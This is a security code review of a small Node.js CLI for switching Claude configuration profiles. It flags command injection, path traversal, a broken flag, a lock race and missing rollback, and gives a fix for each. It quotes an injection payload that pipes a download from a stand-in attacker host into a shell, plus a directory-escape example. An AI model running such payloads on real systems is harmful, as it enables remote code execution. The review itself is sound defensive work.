# Code Review: CSP CLI Implementation

**Date:** 2026-03-11 | **Scope:** 17 files (~600 LOC) | **Focus:** security, correctness, code quality

## Overall Assessment

Well-structured, modular CLI with clean separation of concerns. However, two critical security gaps and several correctness bugs need addressing before distribution.

## Critical Issues

### 1. Command injection via execSync (export.js:18, import.js:28, safety.js:60)

Profile names and file paths are interpolated directly into shell commands. Double quotes do NOT prevent `$(...)` or backtick expansion.

**Attack vector:** `csp import --name '$(curl attacker.com/x|sh)' archive.tar.gz` executes arbitrary commands. No prior profile needed for import path.

**Fix:** Use `execFileSync` with argument arrays instead of string interpolation:
```js
// Before (vulnerable)
execSync(`tar -czf "${outputPath}" -C "${profileDir}" .`);
// After (safe)
execFileSync('tar', ['-czf', outputPath, '-C', profileDir, '.']);
```

### 2. No profile name validation — path traversal (profile-store.js:53-55)

`getProfileDir(name)` is `join(PROFILES_DIR, name)` with no sanitization. Names like `../../etc/cron.d` escape the profiles directory.

**Fix:** Add name validation in a shared guard:
```js
const SAFE_NAME = /^[a-zA-Z0-9_-]+$/;
export const validateName = (name) => {
  if (!name || !SAFE_NAME.test(name)) throw new Error(`Invalid profile name: "${name}"`);
};
```
Apply in `createCommand`, `useCommand`, `deleteCommand`, `exportCommand`, `importCommand`.

## Major Issues

### 3. `--no-save` flag is broken (use.js:60)

Commander's `--no-save` sets `options.save = false` (not `options.noSave`). Code checks `!options.noSave` which is always `!undefined === true`. Saving always happens regardless of flag.

**Fix:** Change `!options.noSave` to `options.save !== false` on line 60.

### 4. Lock file TOCTOU race (safety.js:9-25)

`existsSync` + `writeFileSync` is not atomic. Two concurrent processes can both pass the check. Use `O_EXCL` flag via `writeFileSync` with `{ flag: 'wx' }` and catch `EEXIST`.

### 5. No rollback on partial switch failure (use.js:58-84)

If `restoreFiles` throws after `removeSymlinks`+`removeFiles` succeed, `~/.claude` is left in a broken state (managed items deleted, new profile half-applied). The backup exists but no automatic recovery.

**Fix:** Wrap restore in try/catch; on failure, restore from the backup just created and re-throw.

### 6. Unbounded backup accumulation (safety.js:75-101)

`createBackup()` runs on every `csp use` but backups are never pruned. Over time this consumes arbitrary disk space.

**Fix:** After creating backup, prune to keep only N most recent (e.g., 5).

## Minor Issues

### 7. `pgrep -f "claude"` false positives (safety.js:60)

Matches any process whose command line contains "claude" — including `csp` itself when run from a path containing "claude". Use `pgrep -x claude` for exact match or check for the specific Claude Code binary.

### 8. Unused import: `basename` in export.js:3

Imported but never used. Remove it.

### 9. diff.js reads directories with readFileSync (diff.js:64)

When both profiles have a directory entry (e.g., `commands/`), `readFileSync` on a directory throws. The `catch` labels it "could not compare" but should do recursive directory diff for useful output.

### 10. init.js tight coupling to createCommand (init.js:19)

Calls `createCommand('default', { description: '...' })` directly — fragile if createCommand's signature changes. Works today but warrants a comment.

## Positive Observations

- Clean module boundaries, no circular dependencies
- Lock mechanism exists (needs hardening but concept is correct)
- Backup-before-switch is good defensive practice
- `NEVER_TOUCH` list properly protects credentials and session data
- `SYMLINK_ITEMS` whitelist in `createSymlinks` prevents arbitrary symlink creation
- Dry-run support in `use` command is well implemented
- Good UX: active profile protection in delete, "current" alias in diff

## Recommended Actions (priority order)

1. **Add profile name validation** — blocks both path traversal and injection
2. **Replace execSync string interpolation with execFileSync** — eliminates injection
3. **Fix `--no-save` flag** — one-line fix, currently broken feature
4. **Harden lock file** — use `O_EXCL` atomic creation
5. **Add rollback on failed switch** — protect user config integrity
6. **Add backup pruning** — prevent disk space leak

## Unresolved Questions

- Should `csp import` validate tarball contents before extraction (e.g., reject entries with `../` paths — tar path traversal)?
- Should there be a max profile name length limit?
- Is the `COPY_ITEMS` list (including `.env`) intentional? Copying `.env` between profiles may leak secrets if profiles are exported/shared.
